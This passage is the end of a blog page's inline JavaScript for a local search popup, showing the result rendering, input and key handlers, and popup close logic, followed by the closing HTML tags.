              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
